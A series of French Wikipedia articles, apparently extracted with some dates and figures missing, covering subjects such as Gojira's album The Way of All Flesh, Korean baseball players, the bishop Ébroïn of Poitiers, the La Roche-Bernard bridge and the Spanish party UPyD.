The Way of All Flesh est le studio du groupe français de death metal technique Gojira. Cet album est sorti le en Europe via Listenable Records et le pour les États-Unis avec Prosthetic Records.
La pochette de l'album a été réalisée par Joe Duplantier, le chanteur du groupe. Joe avait déjà dessiné la couverture du précédent album "From Mars to Sirius". Cet album a été enregistré dans le Home-Studio du groupe, à Ondres, mais la batterie le fut à Los Angeles avec le producteur Logan Mader (Cavalera Conspiracy, Soulfly) qui a également effectué le mixage et le mastering.
Comme Joseph Duplantier le dit dans Total Guitar magazine, l'album traite de leur vision de la vie et de la mort.
Le chanteur de Lamb of God, Randy Blythe, prête sa voix dans la chanson "Adoration for None".
L'album est influencé par la scène metal américaine.
Production et Sortie.
En , après deux ans de tournée, Gojira annonce commencer la composition de leur prochain album. est composé en 4 mois entre et , le groupe n'arrivant pas à composer pendant les tournées. L'album est presque entièrement composé par Joe et Mario Duplantier, Labadie et Andreu ayant préféré se reposer à la suite des différentes tournées de Gojira.
L'enregistrement a lieu entre avril et dans leur Studio des Milans. La batterie est enregistrée à Los Angeles par Logan Mader pendant que le reste du groupe se concentre sur le reste de l'album dans leur studio avec leur ingénieur son Laurentx Etchemendy; avant que le tout soit mixé par Mader durant deux semaines.
Le , Gojira ouvre pour la première fois un concert de Metallica, à Arras au Festival Rock où ils joueront pour la première fois "Vacuity". Le sort via Listenable Records et le lendemain en Amérique du Nord via Prosthetic Records.
Style musical et Thématique.
 est une réflexion sur la vie et la mort, « Le chemin de toute chair est tout ce que nous devons traverser jusqu'à la mort » dit Joe Duplantier dans une interview. Le son du groupe se caractérise par une plus grande influence du metal américain.
Réception.
La première semaine de sa sortie, se vend à 4200 exemplaire et entre à la position sur le graphique "Billboard" 200. En France, l'album atteint la place sur le graphique Top Albums, et sur le graphique Suomen virallinen lista en Finlande. Il a atteint également la place du tableau des albums indépendants "Billboard" 200. En décembre, "The Way of All Flesh" est cité sur la liste des meilleurs albums 2008 de "Metal Hammer", et des meilleurs albums de métal de 2008 par "LA Weekly".

</doc>
<doc id="3215578" url="https://fr.wikipedia.org/wiki?curid=3215578" title="Ébroïn">
Ébroïn

Ébroïn ou Eberwin (littéralement « Ami du Sanglier ») est un anthroponyme masculin d'origine germanique, porté notamment par :

</doc>
<doc id="3215583" url="https://fr.wikipedia.org/wiki?curid=3215583" title="Kim Hyun-soo (baseball)">
Kim Hyun-soo (baseball)

Kim Hyun-soo (né le à Séoul, Corée du Sud) est un voltigeur des Phillies de Philadelphie de la Ligue majeure de baseball. De 2006 à 2015, il joue avec les Doosan Bears de Séoul dans la ligue sud-coréenne de baseball.
Il a obtenu la médaille d'or de baseball lors des Jeux olympiques 2008 à Pékin, la médaille d'argent au Classique mondiale de baseball 2009 et la médaille d'or aux Jeux asiatiques de 2010 
Biographie.
Corée du Sud.
En 9 saisons avec les Doosan Bears de Séoul de l'Organisation coreenne de baseball, de 2006 à 2015, Kim Hyun-soo maintient une moyenne au bâton e ,318 et une moyenne de présence sur les buts de ,406. Il se classe cinq fois dans le top 5 de la ligue pour les points produits et les buts-sur-balles. 
En 2015, il frappe 28 circuits, produit 121 points en 141 matchs des Bears, et maintient une moyenne au bâton de ,326 et une moyenne de présence sur les buts de ,438.
Ligue majeure de baseball.
Le , Kim signe un contrat de 7 millions de dollars US pour deux saisons chez les Orioles de Baltimore de la Ligue majeure de baseball.
Il fait ses débuts le avec Baltimore. En 151 matchs joués pour Baltimore au cours des saisons 2016 et 2017, Kim frappe pour ,281 de moyenne au bâton avec 7 circuits et 32 points produits.
Le , Baltimore échange Kim et le lanceur gaucher des ligues mineures Garrett Cleavinger aux Phillies de Philadelphie contre le lanceur droitier Jeremy Hellickson.

</doc>
<doc id="3215584" url="https://fr.wikipedia.org/wiki?curid=3215584" title="Ébroïn (évêque de Poitiers)">
Ébroïn (évêque de Poitiers)

Ébroïn († ) est évêque de Poitiers de 839 à 854, et archichapelain du roi Charles le Chauve.
Biographie.
Il est attesté dès 831 comme responsable de la chancellerie de Louis le Pieux, dans un diplôme rédigé aux deux noms de l'empereur et de son fils le roi , expédié d'Aix-la-Chapelle en faveur de l'abbaye de Cormery ; le diacre Suabodus signe « à la place » ("in vice") d'Ébroïn (formule canonique).
Il devient évêque pendant une période troublée de l'histoire de Poitiers. En effet, un an avant sa nomination, le roi meurt, et son père l'empereur Louis le Pieux confie le royaume d'Aquitaine à son dernier fils, le futur Charles le Chauve. Le comte de Poitiers est alors Émenon et soutient les droits de , le fils de . Louis le Pieux marche alors sur Poitiers, qu'il occupe à la Noël 839, dépose Émenon et nomme à sa place un comte du nom de Renaud, qui pourrait être Renaud d'Herbauges. Ébroïn devient alors à la fois évêque et abbé de Saint-Hilaire de Poitiers. 
En 840, c'est Bernard le Poitevin qui est nommé à la tête du comté, mais il ne semble pas contrôler la ville. Louis le Pieux meurt et ses fils se déchirent. En octobre 840, Hilduin de Saint-Denis passe dans le camp de et est destitué de ses titres en Francie occidentale ; Ébroïn lui succède comme abbé de Saint-Germain-des-Prés. Il est aussi archichapelain du palais de Charles le Chauve. 
La bataille de Fontenoy-en-Puisaye, entre et d'une part et et Charles le Chauve d'autre part, conduit au traité de Verdun qui entérine le partage de l'Empire. L'Aquitaine est attribuée à Charles le Chauve, mais continue à la contrôler et à résister à Charles. 
Au printemps 844, Charles le Chauve assiège Toulouse, défendue par Bernard de Septimanie, partisan de ; Ébroïn, que ses titres ecclésiastiques n'empêchent de participer aux guerres, selon les mœurs de l'époque, fait partie d'une armée qui est défaite par les troupes de dans l'Angoumois ; prisonnier, il est libéré quelque temps après, assez tôt pour présider en décembre le concile de Verneuil-en-Halatte, convoqué par Charles le Chauve (à titre d'archichapelain, bien que Wenilon, archevêque de Sens, fût présent).
Le , veille de Pâques, des Normands commandés par le chef Ragnar, après avoir remonté la Seine en ravageant tout sur leur passage, entrent dans Paris abandonné de ses habitants ; les moines de Saint-Germain-des-Prés se sont enfuis avec les reliques de leur saint patron dans leur domaine de Combs-la-Ville ; Charles le Chauve est retranché dans l'abbaye de Saint-Denis qu'il a juré de défendre. Mais il y eut seulement négociation à Saint-Denis entre le roi et le chef Ragnar, qui accepta de se retirer contre sept mille livres d'argent. Lorsque les Normands furent partis, Ébroïn alla en procession jusqu'à la Bièvre pour recevoir ses moines porteurs des reliques de saint Germain, qui furent replacés solennellement dans le tombeau le . L'abbé fit faire deux récits des miracles qui s'étaient produits pendant ces événements, lesquels se trouvent dans les "Miracula sancti Germani" d'Aimoin de Saint-Germain-des-Prés, lui-même témoin oculaire. 
Ce n'est qu'en 848 que Pépin, après avoir abandonné Bordeaux aux Vikings, est déposé par les Aquitains qui se rallient à Charles le Chauve. Bernard le Poitevin est mort depuis 844, lors de combats contre . Poitiers est administrée civilement et religieusement par l'évêque Ébroïn, homme de Charles le Chauve.
En 853, Charles le Chauve accuse Gauzbert, comte du Maine, de collusion avec les Bretons, alors en révolte, et le fait exécuter. C'est un noble important, apparenté à de nombreux seigneurs locaux, dont Ramnulf, Bernard de Gothie, fils de Bernard le Poitevin, et même à Ébroïn lui-même. Les nobles aquitains en profitent pour se révolter contre Charles le Chauve et offrent la couronne d'Aquitaine à Louis le Germanique, lequel envoie son fils à la tête d'une armée. Mais celle-ci s'occupe plus de pillage que de prendre en main le pays, et une émeute éclate à Poitiers entre partisans et adversaires du roi, au cours de laquelle Ébroïn est tué.
Il fut inhumé dans la nef de l'église Saint-Cyprien de la ville (démolie en 1559). Voici son épitaphe : 
Famille.
Tout ce que l'on sait de la famille est qu'il est cousin du comte , fils de Gauzlin et d'Adaltrude. Le prénom d'Ébroïn est également porté une génération plus tôt par un évêque de Bourges. D'autres considérations ont conduit à Christian Settipani de faire d'Ébroin de Poitiers le neveu d'Ébroïn de Bourges et d'Adaltrude, femme de Gauzlin du Maine et des descendants du prince pépinide Godefried, fils de Drogon de Champagne et d'une autre Adaltrude.

</doc>
<doc id="3215586" url="https://fr.wikipedia.org/wiki?curid=3215586" title="Mamadali Mahmoudov">
Mamadali Mahmoudov

Mamadali Mahmoudov, également connu sous le nom de Evril Touran, est un écrivain ouzbek (d'abord soviétique), né le dans la région de Djizzak et mort le 16 octobre 2020 à l’hôpital Yunasabad de Tachkent, d’une attaque cardiaque.
Après avoir exercé plusieurs métiers (berger, mécanicien…), il commence une carrière littéraire à 27 ans, d'abord comme critique littéraire avant de publier dans des périodiques et d'étudier le journalisme à l'université de Tachkent. Devenu journaliste et écrivain, il côtoie de grands noms comme la poétesse Zoulfia ou les écrivains Charaf Rachidov et Odil Yoqoubov. En 1977, son ouvrage "Le Loup de Bogdon" fait de lui le premier écrivain à souhaiter l'indépendance de l'Ouzbékistan. Il est ainsi régulièrement la cible d'interrogatoires du KGB durant les années 1980 et est contraint de laisser son poste de secrétaire de l'Union des écrivains d'Ouzbékistan après avoir dénoncé certains agissements de Islam Karimov, à l'époque premier secrétaire du parti communiste ouzbek.
Ses agissements, ainsi que sa sympathie pour le parti d'opposition Erk après l'indépendance de l'Ouzbékistan, lui ont attiré les foudres de Karimov, devenu le chef du pays après l'indépendance. Mahmoudov a été une première fois emprisonné entre le et le pour . Il est ensuite de nouveau arrêté à la suite des attentats du 16 février 1999, avant d'être condamné le 18 août à 14 ans de prison pour des motifs fictifs de complot et d'organisation de malfaiteurs (les charges consistant en la détention de numéros de la revue du parti "Erk" et participation à une association criminelle. À son procès, il témoigne avoir été torturé de diverses manières par la police. Il est incarcéré à la prison de Navoï, puis transféré au centre médical de Tachkent, puis enfin au camp de travail de Tchirtchik. Il reçoit un coup derrière la tête en octobre 2012 et est extrêmement affaibli par la détention. En 2013, il est à nouveau transféré à la prison de Tachkent, où il est jugé pour violation du règlement de la prison, et condamné à trois ans supplémentaires le 8 avril. Après avoir fait appel, il est libéré onze jours après cette nouvelle condamnation, le 19 avril 2013.

</doc>
<doc id="3215588" url="https://fr.wikipedia.org/wiki?curid=3215588" title="Flesh and Blood (album de Poison)">
Flesh and Blood (album de Poison)

Flesh and Blood est le studio de Poison enregistré en 1990, sorti le .
Notes.
C'est le dernier album studio enregistré par le groupe d'origine avant la reformation de fin de siècle.

</doc>
<doc id="3215589" url="https://fr.wikipedia.org/wiki?curid=3215589" title="Lee Yong-kyu">
Lee Yong-kyu

Lee Yong-kyu (né le à Gunsan, Corée du Sud) est un joueur coréen de baseball qui joue avec les Hanwha Eagles de Daejeon dans la ligue sud-coréenne de baseball.
Il a obtenu la médaille d'or de baseball lors des Jeux olympiques 2008 à Pékin.

</doc>
<doc id="3215591" url="https://fr.wikipedia.org/wiki?curid=3215591" title="Scottish Seabird Centre">
Scottish Seabird Centre

Le Scottish Seabird Centre (littéralement de l'anglais « centre écossais des oiseaux de mer ») est un parc ornithologique du nord de l'Écosse. Il est situé près de North Berwick dans l'East Lothian et a été inauguré par Charles de Galles en 2000. Il a été financé par la Millennium Commission.
La pièce centrale du centre est reliée à un réseau de caméras qui filme les colonies d'oiseaux de mer, par exemple celle de Bass Rock ou de Fidra. C'est également le point de départ d'une randonnée pédestre d'observation et d'un circuit en bateau.

</doc>
<doc id="3215593" url="https://fr.wikipedia.org/wiki?curid=3215593" title="Les Cendres d'Angela (film)">
Les Cendres d'Angela (film)

Les Cendres d'Angela ("Angela's Ashes") est un film américano-irlandais réalisé par Alan Parker et sorti en 1999. C'est l'adaptation cinématographique du roman autobiographique du même nom de Frank McCourt.
Le film reçoit des critiques partagées et est un échec commercial. Il obtient cependant une nomination aux Oscars et aux Golden Globes.
Synopsis.
Dans les années 1930, alors que beaucoup d'Irlandais émigrent vers les États-Unis, la famille McCourt fait le chemin inverse et quitte Brooklyn pour retourner à Limerick. La mère, Angela, doit se battre pour élever ses enfants. Son mari est incapable de trouver un emploi et quand il déniche un petit boulot, il dépense sa maigre paie dans les bars. Leur fils aîné, Frank, tente de s'en sortir dans cette Irlande marquée par la Grande Dépression et où sévit l'exclusion sociale.
Production.
Genèse et développement.
Le film s'inspire du roman autobiographique "Les Cendres d'Angela" de Frank McCourt (publié en 1996). Le roman est un succès, traduit dans 25 langues et publiés dans 36 pays, il obtient par ailleurs le prix Pulitzer de la biographie ou de l'autobiographie l'année suivante.
Attribution des rôles.
Liam Neeson est initialement engagé pour incarner Malachy, mais quitte finalement le projet. Pierce Brosnan et Stephen Rea sont également envisagés.
Il s'agit du dernier film de Martin Benson.
Tournage.
Le tournage se déroule en Irlande dans la ville de l'intrigue, Limerick, mais également aux studios Ardmore de Bray, ainsi qu'à Arklow, Cobh, Cork et Dublin.
Accueil.
Le film reçoit des critiques partagées. Sur l'agrégateur américain Rotten Tomatoes, il récolte 51% d'opinions favorables pour 86 critiques et une note moyenne de . Sur Metacritic, il obtient une note moyenne de pour 32 critiques.
En France, le film obtient une note moyenne de sur le site AlloCiné, qui recense 14 titres de presse.
L'acteur Richard Harris, originaire de Limerick, critiquera publiquement le roman et le film d'Alan Parker pour la représentation de sa ville natale, beaucoup trop sombre et exagérée selon lui.
Malgré le succès du roman original, le film est un échec au box-office. Avec un budget de 25 millions de dollars, il ne rapporte que aux États-Unis. En France, il n'attire que entrées.

</doc>
<doc id="3215595" url="https://fr.wikipedia.org/wiki?curid=3215595" title="Nombre de Cauchy">
Nombre de Cauchy

Le nombre de Cauchy formula_1 est un nombre sans dimension utilisé en mécanique des fluides. Il représente le rapport entre les forces d'inertie et les forces élastiques.
Ce nombre porte le nom d'Augustin Louis Cauchy, mathématicien et physicien français.
On le définit de la manière suivante :
formula_2
avec :
Si "K" est isentropique, le nombre de Cauchy est égal au nombre de Mach au carré : Ca = Ma. Le module d'élasticité peut être décrit par l'expression suivante :
formula_3
avec :
Dans le cas d'un gaz parfait, la pression peut être calculée selon la loi des gaz parfaits : formula_6, d'où formula_7. 

</doc>
<doc id="3215598" url="https://fr.wikipedia.org/wiki?curid=3215598" title="Bacon (Côte d'Ivoire)">
Bacon (Côte d'Ivoire)

Bacon est une localité du sud de la Côte d'Ivoire, située dans la Région de l'Agnéby, et dans le département d'Akoupé. La localité de Bacon est chef-lieu de commune.

</doc>
<doc id="3215603" url="https://fr.wikipedia.org/wiki?curid=3215603" title="Lee Jin-young">
Lee Jin-young

Lee Jin-young (né le à Gunsan, Corée du Sud) est un joueur coréen de baseball qui joue avec les KT Wiz de Suwon dans la ligue sud-coréenne de baseball.
Il a obtenu la médaille d'or de baseball lors des jeux olympiques 2008 à Pékin.

</doc>
<doc id="3215604" url="https://fr.wikipedia.org/wiki?curid=3215604" title="Nombre de cavitation">
Nombre de cavitation

Le nombre de cavitation est un nombre sans dimension utilisé en mécanique des fluides. Il représente le rapport entre la pression locale et la pression dynamique.
Définition.
Le nombre de cavitation formula_1 ou formula_2 est défini par :
Nombre de cavitation : formula_3
avec :
Ce nombre est aussi appelé nombre de Leroux et est parfois confondu avec le nombre de Thoma. Le nombre de cavitation est un cas particulier du nombre d'Euler.

</doc>
<doc id="3215607" url="https://fr.wikipedia.org/wiki?curid=3215607" title="Colomba Fofana">
Colomba Fofana

Colomba Fofana (né le à Courbevoie) est un athlète français spécialisé dans le triple saut. Il mesure 1,87 m et pèse 81 kg. Il est au club de l'AC Paris Joinville.
Aux Jeux olympiques de Pékin en 2008, il termine 29ème des séries sans atteindre la phase finale [1].
Il est notamment vice-champion de France du triple saut élite en à Niort avec un essai à 17,10 m et champion de France en salle en à Paris-Bercy avec un triple bond à 17,16 m.
Records personnels.
Meeting de Forbach - Triple saut (17,34 m) 
Liens externes.
1. Résultat aux Jeux de 2008 :paru sur le site "pekin.franceolympique.com" (consulté le ).

</doc>
<doc id="3215611" url="https://fr.wikipedia.org/wiki?curid=3215611" title="Evril Touran">
Evril Touran



</doc>
<doc id="3215613" url="https://fr.wikipedia.org/wiki?curid=3215613" title="Blue Skies">
Blue Skies



</doc>
<doc id="3215616" url="https://fr.wikipedia.org/wiki?curid=3215616" title="Pont de La Roche-Bernard">
Pont de La Roche-Bernard

Le pont de marzan est un pont suspendu enjambant la Vilaine entre les communes de Marzan et Nivillac dans le département du Morbihan. Il est communément attaché à La Roche-Bernard, chef-lieu du canton à proximité immédiate. Sa longueur totale est de .
Premier pont.
Dès 1827, la municipalité de La Roche-Bernard demande la construction d'un pont pour traverser la Vilaine. Le une loi est adoptée déterminant l'apport de l'État, , en complément de celui du département du Morbihan pour un pont suspendu permettant le passage des bateaux à voile jusqu'à 500 tonneaux. Dix ans plus tard, la construction d'un premier pont suspendu débute sous la conduite de l'ingénieur Leblanc. Inauguré par le préfet du Morbihan le , le pont mesure (dont de portée) de long pour six mètres de largeur pour un coût total de  francs.
Le une violente tempête détruit le tablier du pont lorsque celui-ci entra en résonance avec le vent. Les mouvements d'oscillation du tablier ont entrainé la rupture des câbles porteurs et le tablier s'effondra dans la Vilaine. L'ancien chaland de transport entre les deux rives reprit alors du service. Mais ce bateau subit un accident en et ne peut plus servir à la traversée. Un nouveau tablier est donc construit et celui-ci ne durera que jusqu'au , date d'une nouvelle tempête qui emporte une nouvelle fois le tablier.
Fin 1872 une passerelle en bois provisoire est installée par l'ingénieur Georges Forestier entre les piles du pont. Cette passerelle provisoire durera jusqu'en 1911, lorsqu'un nouveau pont en arc est construit.
Deuxième pont.
En 1882, le préfet du Morbihan réclame la construction d'un nouveau pont et l'ingénieur Lebert propose quatre ponts, dont deux suspendus. Faute de financement, le nouveau pont en arc choisit sera inauguré le . Construit à l'emplacement du pont précédent, il mesure (dont au-dessus de l'eau) de long et de large. Sa hauteur au-dessus du niveau de la Vilaine est de .
Ce pont est utilisé par la route nationale et par la ligne Vannes Saint Nazaire des Chemins de fer du Morbihan.
En , l'armée allemande avait pour mission de tenir l'axe de communication entre les bases sous-marines de Saint-Nazaire et Lorient. Avec la libération de Vannes (à mi-chemin entre Lorient et Saint-Nazaire) le , l'armée allemande se prépare maintenant à voir arriver l'armée américaine vers ses bases sous-marines. Des explosifs sont installés sur le pont de La Roche-Bernard pour empêcher l'armée américaine de venir sur Saint-Nazaire. Le , un orage provoque accidentellement l'explosion du pont lorsque la foudre s'abat sur les explosifs.
Peu après la guerre, un pont flottant est installé à partir d'éléments de Port Mulberry à Arromanches. La circulation des bateaux est interrompue jusqu'à la suppression de ce pont flottant après la mise en service du pont actuel.
Pont actuel.
La construction d'un nouveau pont débute en 1957 sous la direction de l'ingénieur Gallard. Monsieur Gilbert Baty y a contribué. En 1960, les tests de sécurité sont effectués (le pont supporte, entre autres, sans anomalie) et l'inauguration a lieu le . Les points d'ancrage sont particuliers car les câbles porteurs sont enroulés autour des masses rocheuses présentes de chaque côté de la Vilaine. Les piles mesurent de hauteur, le tablier domine la Vilaine de , la portée principale est de et la longueur totale de l'ouvrage atteint . Le pont n'étant plus suffisant pour le trafic automobile croissant entre les deux rives, on a construit en 1995, le pont du Morbihan à en amont.

</doc>
<doc id="3215617" url="https://fr.wikipedia.org/wiki?curid=3215617" title="Nombre de Clausius">
Nombre de Clausius

Le nombre de Clausius formula_1 est un nombre sans dimension utilisé en transfert thermique. Il est utilisé pour caractériser le transfert thermique dans des flux turbulents.
Ce nombre porte le nom de Rudolf Clausius, physicien allemand.
On le définit de la manière suivante :
formula_2
avec :

</doc>
<doc id="3215619" url="https://fr.wikipedia.org/wiki?curid=3215619" title="Bonahouin">
Bonahouin

Bonahouin est une localité du sud de la Côte d'Ivoire, située dans la Région de la Mé, dans le département d'Akoupé et dans la Sous-préfecture de Bécouefin. La localité de Bonahouin est chef-lieu de commune.

</doc>
<doc id="3215620" url="https://fr.wikipedia.org/wiki?curid=3215620" title="The British Bulldog">
The British Bulldog



</doc>
<doc id="3215624" url="https://fr.wikipedia.org/wiki?curid=3215624" title="Électrométéore">
Électrométéore

On appelle électrométéore tout phénomène, audible ou visible, lié à des décharges électriques dans l'atmosphère. On distingue généralement :
En outre, les mécanismes électriques avancés pour expliquer les lumières de séisme, s'ils sont confirmés, pourraient les classer parmi les électrométéores.

</doc>
<doc id="3215627" url="https://fr.wikipedia.org/wiki?curid=3215627" title="Kang Min-ho">
Kang Min-ho

Kang Min-ho (né le à Jeju, Corée du Sud) est un joueur sud-coréen de baseball qui joue avec les Samsung Lions de Daegu dans la ligue sud-coréenne de baseball.
Il a obtenu la médaille de bronze de baseball lors des Jeux asiatiques 2006 à Doha, et la médaille d'or de baseball lors des Jeux olympiques 2008 à Pékin.

</doc>
<doc id="3215632" url="https://fr.wikipedia.org/wiki?curid=3215632" title="Fade to Black (chanson de Metallica)">
Fade to Black (chanson de Metallica)

 est une chanson du groupe de thrash metal Metallica apparaissant sur leur deuxième album, "Ride the Lightning" (1984). Elle fut la première ballade musicale sortie par le groupe. Elle a été classée solo de guitare jamais fait par les lecteurs du magazine "Guitar World".
Contexte.
La chanson a été écrite par James Hetfield lorsque le groupe s'est fait voler son matériel juste après un concert à Boston, la veille de leur première tournée en Europe.
Reprise.
La chanson a été reprise par Sonata Arctica, par le groupe Apocalyptica sur leur album Inquisition Symphony, par le groupe Apoptygma Berzerk sur leur album "Welcome to Earth" et également par le groupe Disturbed.

</doc>
<doc id="3215636" url="https://fr.wikipedia.org/wiki?curid=3215636" title="Samsung super league">
Samsung super league



</doc>
<doc id="3215641" url="https://fr.wikipedia.org/wiki?curid=3215641" title="Tsaghkadzor">
Tsaghkadzor



</doc>
<doc id="3215643" url="https://fr.wikipedia.org/wiki?curid=3215643" title="Dzaghgadzor">
Dzaghgadzor



</doc>
<doc id="3215650" url="https://fr.wikipedia.org/wiki?curid=3215650" title="Francisco Solano (dessinateur)">
Francisco Solano (dessinateur)



</doc>
<doc id="3215659" url="https://fr.wikipedia.org/wiki?curid=3215659" title="Jin Kab-yong">
Jin Kab-yong

Jin Kab-Yong (né le à Pusan, Corée du Sud) est un instructeur coréen de baseball qui joue avec les Samsung Lions de Daegu dans la ligue sud-coreenne de baseball.
Il a obtenu la médaille d'or de baseball lors des jeux asiatiques 1998 à Bangkok de la Thaïlande et lors des Jeux asiatiques 2002 à Pusan, et la médaille d'or de baseball lors des jeux olympiques 2008 à Pékin.
Il a obtenu la à la Classique mondiale de baseball 2006.

</doc>
<doc id="3215663" url="https://fr.wikipedia.org/wiki?curid=3215663" title="Union, progrès et démocratie">
Union, progrès et démocratie

Union, progrès et démocratie ( ; UPyD, selon les statuts du parti, ou UPD) est un parti politique espagnol ayant existé de 2007 à 2020.
Rosa Díez —dans une interview journalistique avant l'inscription de UPyD au Registre des Partis Politiques et dans une interview télévisée postérieure en 2007— et Mikel Buesa —lors d'une présentation du parti en 2007— ont expliqué l'origine des trois concepts qui constituent le nom du parti : Union, pour sa défense inconditionnelle de l'unité de l'Espagne comme condition nécessaire à l'égalité devant la loi de tous les Espagnols. Progrès, parce qu'il s'agissait d'un parti progressiste de racines social-libérales et respectueux des libertés civiles et de la liberté de choix. Et Démocratie, parce que c'était un parti radical qui a lutté pour la régénération de la démocratie depuis l'intérieur des institutions.
Rosa Díez, Fernando Savater, Carlos Martínez Gorriarán et Juan Luis Fabo se sont chargés de décider du nom du parti et de l'inscrire au registre des partis politiques. Ils ont choisi les concepts de « union, progrès et démocratie », selon les mots de Rosa Díez, « parce qu'il manquait un parti qui fasse la nécessaire pédagogie démocratique et défende sans complexe ces concepts en Espagne. Parce qu'en effet, l'union entre les Espagnols fait défaut, les politiques progressistes manquent et il y a encore beaucoup de chemin à parcourir pour parvenir à une démocratie de qualité ».
Histoire.
Origines.
Le samedi , se sont réunies à San Sebastián dans le but de débattre sur le besoin et la possibilité de créer un nouveau parti politique pour faire face aux deux principaux partis politiques nationaux, le Parti populaire (PP) et le Parti socialiste ouvrier espagnol (PSOE). Dans cette réunion, beaucoup des participants étaient des Basques, la plupart avec une longue expérience dans des organisations politiques, syndicales et civiques, et dans de nombreux cas provenant de la gauche, mais aussi de la tradition libérale et citoyenne. Après cette rencontre, ils prennent la décision de lancer un nouveau projet politique national.
Pour ce faire, ils créent une association, "Plataforma Pro". Des colloques ont eu lieu partout en Espagne pour présenter le projet, en exposant les objectifs du parti à créer, dont les principaux étaient :
Parmi les membres ou collaborateurs de la plateforme se trouvaient notamment : le philosophe Fernando Savater, le porte-parole de « ¡Basta Ya! », Carlos Martínez Gorriarán, ou l’eurodéputée Rosa Díez, qui annonce en août sa renonce au siège au Parlement européen ainsi que l'abandon des files du PSOE pour se dédier pleinement au projet.
Parmi les autres groupes qui ont manifesté leur soutien à la "Plataforma Pro", on trouvait l’association "Ciutadans de Catalunya", spécialement ses membres Albert Boadella, Arcadi Espada et , ainsi que l’initiative citoyenne "¡Basta Ya!". De même, une cinquantaine de membres de "Socialistas en Positivo" (un courant critique du PSC) ont aussi rejoint le projet.
Mi-, le président du "Foro de Ermua", Mikel Buesa, annonce son intention de participer au parti politique issu de la "Plataforma Pro".
Finalement, le , dans le théâtre-auditorium de la "Casa de Campo", à Madrid, a eu lieu l’acte public de constitution du parti.
D'autres personnalités qui rejoignent le parti ultérieurement sont : l’écrivain Álvaro Pombo et le sportif Álvaro de Marichalar.
Évolution.
Son inscription au ministère de l’Intérieur a eu lieu le . Parmi ses fondateurs se trouvent : Rosa Díez, ex-eurodéputée socialiste ; Mikel Buesa, ex-président du "Foro de Ermua" et les philosophes Carlos Martínez Gorriarán et Fernando Savater. Ils ont aussi reçu le soutien du prix Nobel de littérature Mario Vargas Llosa et du dramaturge Albert Boadella.
Aux élections législatives de 2008, le parti a obtenu une seule députée, représentant la circonscription de Madrid, Rosa Díez, porte-parole du parti, avec , soit la sixième force politique en Espagne. Il a obtenu un siège au Parlement du Pays basque dans les législatives autonomiques de 2009, ainsi qu’un eurodéputé dans les européennes, aussi en 2009.
Lors des municipales de 2011, le parti est devenu le cinquième parti recueillant le plus de votes (le quatrième des partis non nationalistes périphériques), avec un résultat de 152 conseillers municipaux. Aux législatives de 2011, le parti arrive en quatrième place par nombre de voix, mais en sixième par nombre de députés, avec cinq sièges au Congrès des députés, après avoir obtenu plus d'un million de voix, et avoir été le parti avec la plus forte croissance depuis les dernières élections.
Une nouvelle enquête parue sur" El País", en 2013, a donné à l'UPyD, un résultat estimé de 13,7 % des voix si les élections avaient eu lieu ce jour-là.
Idéologie.
Idéologiquement, l'UPyD se définit comme non nationaliste, transversal, laïque, progressiste, et défenseur d’un modèle fédéraliste en Espagne et en Europe. Son idéologie est aussi fondée sur la régénération démocratique, la démocratie libérale et la citoyenneté comme lien entre l’État avec ses citoyens. Le parti défend donc l'État de droit, laïcité religieuse, idéologique, et d’identité de chaque personne, d’une façon radicale et démocrate-progressiste pour que tous les citoyens soient sur un même pied d’égalité.
Certains moyens de communication et groupes politiques définissent l'UPyD comme un parti centraliste, en raison de ses propositions de dévolution de certaines compétences au gouvernement central, notamment les politiques de santé ou d’éducation. Ces groupes qualifient le parti d’« espagnoliste », fondant cette affirmation sur la proposition d’éliminer de la Constitution Espagnole les références aux nationalités historiques d’Espagne et la protection des langues régionales, dont leur utilisation par certains gouvernements régionaux, que l'UPyD considère comme un « facteur de discrimination ». UPyD insiste sur le fait que les citoyens doivent choisir leur langue, sans politiques actives de protection de la langue (considérées comme des « impositions »).
Cependant, l'UPyD plaide pour un modèle décentralisé, de style fédéral coopératif et symétrique. Il défend en outre la cession de compétences à l’Union européenne, ainsi qu’une Europe fédérale. D’autre part, le parti propose que, dans les communautés autonomes bilingues, les citoyens puissent choisir librement la langue officielle dans laquelle ils veulent être entendus et traités par l’administration, ainsi que d’assurer la connaissance des deux langues tout au long du parcours éducatif. Il s'oppose au système catalan d’immersion linguistique obligatoire dans l'enseignement public vu que le castillan n'est enseigné que trois heures par semaine. Par ailleurs dans les universités certains professeurs donnent leurs cours en catalan, ce qui empêche des Espagnols qui ne connaissent pas le catalan d'aller étudier en Catalogne.
L'UPyD considère également qu’il faut avancer vers un processus constituant de réforme de l’État, où il faudra réorganiser les compétences des différents niveaux administratifs, assurant des droits fondamentaux équivalents à tous les citoyens espagnols sans considération du lieu où ils habitent. Il estime aussi qu’il faut « donner un sens au gouvernement central », pour qu’il soit plus efficace et plus efficient. Aussi le parti a-t-il affirmé dans son premier congrès que l’unité nationale doit être comprise en termes de patriotisme constitutionnel, par opposition à des conceptions nationalistes, ethniques ou mythiques. Certains médias britanniques, comme le " Financial Times" et "The Economist" ont qualifié l'UPyD comme un parti de centre.
Idéologiquement, l'UPyD ne se définit pas comme de gauche ou de droite. Le parti déclare tout au début de son Manifeste fondateur :
Idéologiquement, l’UPyD ne se définit comme de gauche o de droite. L’UPyD se définit comme un parti progressiste, au-delà des étiquettes idéologiques. Le parti est englobé dans le terme utilisé depuis les dernières années « transversalité » : un parti qui veut rejoindre dans son sein des concepts et des idées des deux courants politiques principaux.
Selon les déclarations de la porte-parole Rosa Díez, le parti est « progressiste et transversal : il a gauchistes et personnes de la droite libérale ». Ils affirment avoir comme signes d’identité additionnels le « constitutionnalisme, et sa défense, comme défense de l’État de Droit espagnol, sous la protection de la Constitution espagnole de 1978 ; le laïcisme, comme défense d’un État neutre vis-à-vis des croyances, dans lequel aucune confession religieuse ou identitaire n'a de privilèges ; et le « non nationalisme », comme refus et lutte contre la prévalence des partis nationalistes périphériques et séparatistes dans le système politique espagnol. Face à ceux-là, Rosa Díez définit l’UPyD comme un parti « manifestement national, avec un seul projet pour l’ensemble de l’Espagne ».
Ses propositions principales, selon le parti, sont :
Soutiens.
Depuis qu'il a été fondé, l'UPyD a reçu le soutien de personnalités comme de collectifs, de journalistes et de membres de l'activisme citoyen de l'Espagne. Plusieurs d'entre les promoteurs de l'UPyD sont des membres de "¡Basta ya!", comme Rosa Díez, les philosophes Fernando Savater et Carlos Martínez Gorriarán.
Le parti a aussi reçu le soutien d'autres organisations, comme "Ciutadans de Catalunya", notamment de ses membres Albert Boadella, Arcadi Espada (membre aussi de ¡Basta Ya!), Teresa Giménez Barbat o Félix Pérez Romera (ce dernier a abandonné le parti peu après).
